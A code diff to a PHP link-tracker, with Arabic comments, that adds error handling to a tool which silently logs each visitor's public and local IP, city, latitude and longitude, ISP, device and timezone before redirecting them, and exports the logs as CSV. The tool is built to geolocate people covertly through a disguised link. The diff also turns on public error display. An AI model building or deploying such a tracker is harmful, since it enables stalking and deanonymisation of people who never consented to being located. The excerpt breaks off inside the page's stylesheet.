@@ -1,12 +1,17 @@
 <?php
-// إظهار الأخطاء للتشخيص
+// إجبار PHP على إظهار جميع الأخطاء على الشاشة مباشرة لمنع ظهور الصفحة السوداء
 ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 
-// اتصال قاعدة البيانات مع التعامل مع الأخطاء
+// فحص ما إذا كان الامتداد المطلوب لقاعدة البيانات موجوداً
+if (!extension_loaded('pdo_sqlite')) {
+    die("خطأ حرج: امتداد pdo_sqlite غير مفعل في خادم الويب (PHP). تأكد من تثبيته في ملف Dockerfile.");
+}
+
+// اتصال قاعدة البيانات مع طباعة الخطأ الفعلي إن وجد
 try {
-    $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    $db_file = __DIR__ . '/tracker.db';$db = new PDO('sqlite:' . $db_file);$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
@@ -31,7 +36,7 @@ try {
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 } catch (Exception $e) {
-    die("خطأ في قاعدة البيانات: " . $e->getMessage());
+    die("خطأ في إنشاء أو اتصال قاعدة البيانات: " . $e->getMessage());
 }
 
 function get_real_ip() {
@@ -103,7 +108,7 @@ if (isset($_GET['r'])) {
             $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, country, city, lat, lon, isp, device_info, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
             $logStmt->execute([$code, $public_ip,$local_ip, $geo['country'],$geo['city'], $geo['lat'],$geo['lon'], $geo['isp'],$device, $screen,$tz]);
         } catch (Exception $e) {
-            // تخطي أخطاء السجل لضمان التوجيه
+            // تخطي
         }
 
         header("Location: " . $target);
@@ -154,13 +159,7 @@ if (isset($_GET['export']) && $_GET['export'] == 'true') {$filename = !empty($fi
     }
 
     foreach ($export_logs as$row) {
-        fputcsv($output, [$row['id'], 
-            $row['code'],$row['public_ip'], 
-            $row['local_ip'],$row['country'], 
-            $row['city'],$row['lat'], 
-            $row['lon'],$row['isp'], 
-            $row['device_info'],$row['screen_res'], 
-            $row['timezone'],$row['created_at']
+        fputcsv($output, [$row['id'], $row['code'],$row['public_ip'], $row['local_ip'],$row['country'], $row['city'],$row['lat'], $row['lon'],$row['isp'], $row['device_info'],$row['screen_res'], $row['timezone'],$row['created_at']
         ]);
     }
     fclose($output);
@@ -186,4 +185,15 @@ if (!empty($filter_code)) {
         body { background-color: #0b0f19; color: #f3f4f6; padding: 15px; line-height: 1.5; }
         .container { max-width: 1050px; margin: 0 auto; display: flex; flex-direction: column; gap: 15px; }
         .card { background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
-        .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10
+        .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
+        h1 { color: #38bdf8; font-size: 22px; font-weight: 800; }
+        .stats-group { display: flex; gap: 10px; }
+        .stat-box { background: #1f2937; padding: 8px 14px; border-radius: 8px; text-align: center; border: 1px solid #374151; }
+        .stat-box span { display: block; font-size: 10px; color: #9ca3af; }
+        .stat-box strong { font-size: 16px; color: #38bdf8; }
+        h2 { color: #38bdf8; font-size: 16px; margin-bottom: 12px; font-weight: 700; }
+        .form-group { display: flex; flex-direction: column; gap: 10px; }
+        @media(min-width: 600px) { .form-group { flex-direction: row; } }
+        input[type="text"] { flex: 1; background: #030712; border: 1px solid #374151; border-radius: 8px; padding: 12px; color: #fff; font-size: 14px; outline: none; width: 100%; }
+        input[type="text"]:focus { border-color: #38bdf8; }
+        button, .btn { background: #0284c7; color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: background 0.2s; text-decoration: none; display: inline-block; text-align: center; font-size:
